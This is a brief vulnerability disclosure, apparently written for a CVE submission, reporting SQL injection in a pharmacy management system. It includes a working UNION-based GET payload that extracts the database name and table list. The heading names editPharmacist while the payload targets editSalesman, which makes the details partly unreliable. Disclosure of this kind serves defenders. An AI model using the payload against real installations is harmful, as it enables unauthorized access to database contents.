## editPharmacist

**Description of the vulnerability**
pharmacy_Management_System latest version has SQL injection via editPharmacist, which can get information about the database and even GetShell via SQL injection.



**Vulnerability recurrence**

![image-20240723142715784](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723142715784.png)

![image-20240723142737947](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723142737947.png)

POC

```
GET /index.php?action=editSalesman&id=10}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

Result

![image-20240723142821268](E:/代码审计-cve/pharmacy_Management_System SQL injection vulnerability.assets/image-20240723142821268.png)

